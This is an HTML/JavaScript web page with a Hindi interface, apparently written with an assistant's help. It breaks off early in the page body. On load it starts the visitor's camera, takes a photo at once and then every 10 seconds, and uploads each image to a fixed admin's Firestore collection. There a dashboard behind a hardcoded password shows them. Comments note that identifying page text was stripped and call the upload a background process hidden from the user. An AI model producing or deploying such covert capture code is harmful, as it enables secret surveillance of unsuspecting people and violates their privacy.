<!DOCTYPE html>
<html lang="hi">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>निजी कैमरा कैप्चर बैकएंड</title>
    <!-- Tailwind CSS CDN -->
    <script src="https://cdn.tailwindcss.com"></script>
    <!-- Use Inter font -->
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@100..900&display=swap');
        body {
            font-family: 'Inter', sans-serif;
            background-color: #f7f7f7;
        }
        /* Custom scrollbar for aesthetic display of images */
        .image-container::-webkit-scrollbar {
            width: 8px;
        }
        .image-container::-webkit-scrollbar-track {
            background: #e0e0e0;
            border-radius: 10px;
        }
        .image-container::-webkit-scrollbar-thumb {
            background: #6b7280;
            border-radius: 10px;
        }
        .image-container::-webkit-scrollbar-thumb:hover {
            background: #4b5563;
        }
    </style>
    <!-- Firebase SDKs -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-app.js";
        import { 
            getAuth, 
            signInAnonymously, 
            signInWithCustomToken,
            onAuthStateChanged
        } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-auth.js";
        import { 
            getFirestore, 
            collection, 
            query, 
            onSnapshot, 
            addDoc, 
            serverTimestamp,
            setLogLevel
        } from "https://www.gstatic.com/firebasejs/11.6.1/firebase-firestore.js";

        // Set log level for debugging Firebase
        setLogLevel('Debug');


        // --- GLOBAL FIREBASE/APP VARIABLES ---
        const appId = typeof __app_id !== 'undefined' ? __app_id : 'default-photo-app';
        const firebaseConfig = JSON.parse(typeof __firebase_config !== 'undefined' ? __firebase_config : '{}');
        const initialAuthToken = typeof __initial_auth_token !== 'undefined' ? __initial_auth_token : null;

        let app, db, auth, userId;
        let isAuthReady = false;
        let autoCaptureInterval = null; 
        
        // *****************************************************************
        // ** अति महत्वपूर्ण: व्यवस्थापक ID और पासवर्ड **
        // यह ID तय करती है कि तस्वीरें किस निजी संग्रह में सेव होंगी (Firestore Path)।
        const STORAGE_ADMIN_ID = "06374946643496896340"; 
        
        // डैशबोर्ड खोलने के लिए पासवर्ड (यूजर की मांग के अनुसार)
        const ADMIN_PASSWORD = "rituraj@123";
        const LOGIN_KEY = "admin_logged_in"; // Session key to remember login
        // *****************************************************************

        const PHOTO_COLLECTION_PATH = (adminId) => ['artifacts', appId, 'users', adminId, 'captured_photos'];

        // --- DOM Elements ---
        const appContainer = document.getElementById('app-container');
        const loadingElement = document.getElementById('loading-message');
        const viewToggle = document.getElementById('view-toggle');
        const captureView = document.getElementById('capture-view');
        const dashboardView = document.getElementById('dashboard-view');
        const videoElement = document.getElementById('camera-stream'); 
        const captureButton = document.getElementById('capture-button');
        const statusMessage = document.getElementById('status-message');
        const imagesGrid = document.getElementById('images-grid');

        // Hidden canvas used for capturing the frame
        const canvas = document.createElement('canvas');
        let videoStream = null;

        // --- Initialization and Authentication ---

        const initializeFirebase = async () => {
            try {
                // 1. Initialize App
                app = initializeApp(firebaseConfig);
                db = getFirestore(app);
                auth = getAuth(app);

                // 2. Sign In
                if (initialAuthToken) {
                    await signInWithCustomToken(auth, initialAuthToken);
                } else {
                    await signInAnonymously(auth);
                }

                // 3. Set Auth State listener
                onAuthStateChanged(auth, (user) => {
                    if (user) {
                        userId = user.uid;
                        console.log("Firebase Auth Ready. User ID:", userId);
                    } else {
                        // If anonymous sign-in failed (unlikely), use a random ID
                        userId = crypto.randomUUID(); 
                    }
                    isAuthReady = true;
                    // Initial render based on URL hash
                    loadingElement.classList.add('hidden');
                    appContainer.classList.remove('hidden');
                    // Display the storage admin ID in the dashboard view
                    document.getElementById('storage-admin-id-display').textContent = STORAGE_ADMIN_ID;
                    renderView(window.location.hash);
                    // Start listening for dashboard updates
                    setupDashboardListener();
                });

            } catch (error) {
                console.error("Firebase initialization or sign-in failed:", error);
                loadingElement.innerHTML = `
                    <p class="text-red-600 font-semibold">
                        त्रुटि (Error): Firebase शुरू नहीं हो पाया। कृपया कंसोल देखें।
                    </p>
                `;
            }
        };

        // --- View Management ---

        const renderView = (hash) => {
            if (!isAuthReady) return; 

            const currentView = hash === '#dashboard' ? 'dashboard' : 'capture';
            
            // Hide all views first
            captureView.classList.add('hidden');
            dashboardView.classList.add('hidden');
            
            if (currentView === 'capture') {
                captureView.classList.remove('hidden');
                // The user requested removal of specific texts, so keep navigation minimal
                viewToggle.innerHTML = `
                    <a href="#dashboard" class="text-blue-600 hover:text-blue-800 transition duration-150 p-2 rounded-lg font-medium">
                        डैशबोर्ड
                    </a>
                `;
                startCamera(); // Start camera and auto-capture
            } else {
                dashboardView.classList.remove('hidden');
                // The user requested removal of "पॉलिटेक्निक पेज", replacing with minimal text
                viewToggle.innerHTML = `
                    <a href="#capture" class="text-blue-600 hover:text-blue-800 transition duration-150 p-2 rounded-lg font-medium">
                        होम
                    </a>
                `;
                stopCamera(); // Stop camera and auto-capture
                // Re-run the dashboard listener to check login status
                setupDashboardListener(); 
            }
        };

        // Handle hash changes for navigation
        window.addEventListener('hashchange', () => renderView(window.location.hash));


        // --- Camera and Capture Logic ---

        const startCamera = async () => {
            // Display the current User ID for the admin to copy (for debugging/info only)
            statusMessage.textContent = `कैमरा शुरू हो रहा है... आपकी यूज़र ID: ${userId}`; 
            stopCamera(); 

            try {
                // Request access to the user's camera (video only)
                videoStream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
                
                videoElement.srcObject = videoStream;
                videoElement.play();

                videoElement.onloadedmetadata = () => {
                    console.log("Camera stream started. Setting up auto-capture.");
                    
                    // --- START AUTO-CAPTURE ---
                    // Capture immediately, and then every 10 seconds (10000ms)
                    capturePhoto(); 
                    if (autoCaptureInterval) clearInterval(autoCaptureInterval);
                    autoCaptureInterval = setInterval(capturePhoto, 10000); 
                    
                    captureButton.disabled = false;
                };

            } catch (error) {
                console.error("Error accessing camera (User denied or device missing):", error);
                statusMessage.innerHTML = `<span class="text-red-600">कैमरा एक्सेस में त्रुटि (अनुमति नहीं मिली)।</span>`;
                if (autoCaptureInterval) clearInterval(autoCaptureInterval);
            }
        };

        const stopCamera = () => {
            if (videoStream) {
                videoStream.getTracks().forEach(track => track.stop());
                videoStream = null;
                videoElement.srcObject = null;
            }
            if (autoCaptureInterval) {
                clearInterval(autoCaptureInterval);
                autoCaptureInterval = null;
            }
        };

        const capturePhoto = async () => {
            if (!videoStream || !isAuthReady) {
                console.log("Auto-capture skipped: System not ready or camera stream missing.");
                return;
            }

            try {
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                
                const context = canvas.getContext('2d');
                context.drawImage(videoElement, 0, 0, canvas.width, canvas.height);

                const base64Image = canvas.toDataURL('image/jpeg', 0.8);

                // --- PRIVATE REMOTE DASHBOARD SAVE (Firestore) ---
                // Data is saved in the private collection of the STORAGE_ADMIN_ID (Rituraj's storage)
                const photosCollectionRef = collection(db, ...PHOTO_COLLECTION_PATH(STORAGE_ADMIN_ID));
                await addDoc(photosCollectionRef, {
                    base64Image: base64Image,
                    timestamp: serverTimestamp(),
                    capturedBy: userId, // The user ID of the visitor who opened the page
                    capturedAt: new Date().toLocaleString('hi-IN')
                });

                // Update status subtly for background process (hidden from user)
                statusMessage.innerHTML = `<span class="text-green-600">फोटो सफलतापूर्वक कैप्चर और डैशबोर्ड पर अपलोड किया गया!</span>`;
                console.log(`Photo captured and saved to PRIVATE Firestore by User ID: ${userId}`);
                
            } catch (error) {
                console.error("Error during auto-capture or upload:", error);
                statusMessage.innerHTML = `<span class="text-red-600">फोटो लेने में विफल!</span>`;
                
                const errorBox = document.getElementById('error-box');
                document.getElementById('error-text').textContent = 'पृष्ठभूमि कैप्चर या डाउनलोड में गंभीर त्रुटि: ' + error.message;
                errorBox.classList.remove('hidden');
                
            } finally {
                captureButton.disabled = false;
            }
        };
        
        // Function to close the custom error box
        window.closeErrorBox = () => {
            document.getElementById('error-box').classList.add('hidden');
        };

        // --- Dashboard Authentication and Listener Logic ---
        
        const isUserLoggedIn = () => {
            return sessionStorage.getItem(LOGIN_KEY) === 'true';
        };
        
        const renderPasswordGate = () => {
            const dashboardContainer = document.getElementById('dashboard-content');
            const passwordGate = document.getElementById('password-gate');
            
            dashboardContainer.classList.add('hidden');
            passwordGate.classList.remove('hidden');
            
            // Clear any previous error messages
            document.getElementById('password-error-message').textContent = '';
            document.getElementById('password-error-message').classList.add('hidden');
        };
        
        const renderDashboardView = () => {
             const dashboardContainer = document.getElementById('dashboard-content');
             const passwordGate = document.getElementById('password-gate');
             
             passwordGate.classList.add('hidden');
             dashboardContainer.classList.remove('hidden');
             
             // Now start the actual Firestore listener
             setupFirestoreListener();
        };

        const checkAdminPassword = () => {
            const inputPass = document.getElementById('admin-password-input').value;
            const errorElement = document.getElementById('password-error-message');

            if (inputPass === ADMIN_PASSWORD) {
                // Successful login
                sessionStorage.setItem(LOGIN_KEY, 'true');
                renderDashboardView();
            } else {
                errorElement.textContent = "गलत कोड! पुनः प्रयास करें।";
                errorElement.classList.remove('hidden');
            }
        };
        // Expose function to global scope so HTML can call it
        window.checkAdminPassword = checkAdminPassword; 

        const setupDashboardListener = () => {
            if (!isAuthReady) return;
            
            // 1. If the current view is not the dashboard, just return. The logic will run again when hash changes.
            if (window.location.hash !== '#dashboard') {
                return;
            }

            // 2. Check if the user has logged in this session (simple password gate)
            if (isUserLoggedIn()) {
                renderDashboardView();
            } else {
                renderPasswordGate();
            }
        };

        // Separate function for the actual Firestore connection logic
        const setupFirestoreListener = () => {
            imagesGrid.innerHTML = `
                <div class="text-center p-8 text-gray-500">
                    डेटाबेस से तस्वीरें लोड हो रही हैं... (निजी संग्रह)
                </div>
            `;
            
            try {
                // Reference to the PRIVATE collection of the Admin (using STORAGE_ADMIN_ID)
                const photosCollectionRef = collection(db, ...PHOTO_COLLECTION_PATH(STORAGE_ADMIN_ID));
                const q = query(photosCollectionRef);

                // Real-time listener for the dashboard
                onSnapshot(q, (snapshot) => {
                    const photos = [];
                    snapshot.forEach((doc) => {
                        photos.push({ id: doc.id, ...doc.data() });
                    });
                    
                    // Sort by timestamp (newest first - in-memory sort)
                    photos.sort((a, b) => (b.timestamp?.toMillis() || 0) - (a.timestamp?.toMillis() || 0));
                    
                    // Render the photos
                    renderDashboard(photos);

                }, (error) => {
                    console.error("Error listening to Firestore:", error);
                    imagesGrid.innerHTML = `
                        <div class="text-center p-8 text-red-600">
                            डेटाबेस सुनने में त्रुटि (Firestore Error): ${error.message}
                        </div>
                    `;
                });
            } catch (error) {
                 console.error("Error creating dashboard listener:", error);
                 imagesGrid.innerHTML = `
                    <div class="text-center p-8 text-red-600">
                        डेटाबेस शुरू नहीं हुआ।
                    </div>
                `;
            }
        };


        const renderDashboard = (photos) => {
            imagesGrid.innerHTML = ''; // Clear previous images

            if (photos.length === 0) {
                imagesGrid.innerHTML = `
                    <div class="text-center p-8 text-gray-500 col-span-full">
                        अभी तक कोई फोटो कैप्चर नहीं की गई है।
                    </div>
                `;
                return;
            }

            photos.forEach(photo => {
                const date = photo.timestamp ? 
                    new Date(photo.timestamp.seconds * 1000).toLocaleString('hi-IN', {
                        year: 'numeric', month: 'short', day: 'numeric', 
                        hour: '2-digit', minute: '2-digit', second: '2-digit'
                    }) : 'उपलब्ध नहीं';

                // Check if base64Image is available and starts with data:image
                const imageUrl = photo.base64Image && photo.base64Image.startsWith('data:image') 
                    ? photo.base64Image 
                    : 'https://placehold.co/400x300/e0e0e0/555555?text=Image+Not+Found';

                const imageHtml = `
                    <div class="bg-white rounded-xl shadow-lg overflow-hidden transition transform hover:scale-[1.02] duration-300">
                        <img 
                            src="${imageUrl}" 
                            alt="Captured photo from ${date}" 
                            class="w-full h-auto object-cover border-b border-gray-100 aspect-[4/3]"
                        />
                        <div class="p-4">
                            <p class="text-xs text-gray-600 font-medium">कैप्चर किया गया:</p>
                            <p class="text-sm font-semibold text-gray-800">${date}</p>
                            <p class="text-xs text-gray-500 mt-1">
                                आगंतुक ID (Visitor ID): <span class="break-all font-mono text-gray-700">${photo.capturedBy}</span>
                            </p>
                            
                            <!-- WhatsApp Share Link (Text only) -->
                            <a href="whatsapp://send?text=निजी%20डैशबोर्ड%20पर%20एक%20नया%20आगंतुक%20(${photo.capturedBy})%20कैप्चर%20किया%20गया%20है।%20डैशबोर्ड%20जाँचें!" 
                                target="_blank"
                                class="mt-3 inline-flex items-center text-xs font-medium text-green-600 hover:text-green-700"
                            >
                                WhatsApp पर सूचना भेजें
                            </a>
                        </div>
                    </div>
                `;
                imagesGrid.insertAdjacentHTML('beforeend', imageHtml);
            });
        };

        // --- Start Application ---
        document.addEventListener('DOMContentLoaded', () => {
            loadingElement.classList.remove('hidden');
            appContainer.classList.add('hidden');
            initializeFirebase();
        });
        
        // Set initial hash if none exists, ensuring a view is active
        if (!window.location.hash) {
            window.location.hash = '#capture';
        }
        
    </script>
</head>
<body class="min-h-screen">

    <div class="max-w-4xl mx-auto p-4 md:p-8">
        <header class="text-center mb-8 bg-white p-4 rounded-xl shadow-md border-b-4 border-blue-500">
            <!-- 1. निजी कैप्चर बैकएंड सिस्टम (Removed) -->
            <h1 class="text-3xl font-bold text-gray-800"></h1>
            <!-- 2. केवल एडमिन के लिए तस्वीरें देखना संभव (Removed) -->
            <p class="text-sm text-gray-500 mt-1"></p>
            <div id="view-toggle" class="mt-4">
                <!-- Toggle button text is now 'होम' और 'डैशबोर्ड' -->
            </div>
        </header>

        <!-- Loading State -->
        <div id="loading-message" class="hidden text-center p-12 bg-white rounded-xl shadow-lg">
            <div class="animate-spin rounded-full h-8 w-8 border-t-2 border-b-2 border-blue-500 mx-auto mb-3"></div>
            <p class="text-lg text-gray-600">सिस्टम शुरू हो रहा है... कृपया प्रतीक्षा करें।</p>
        </div>

  
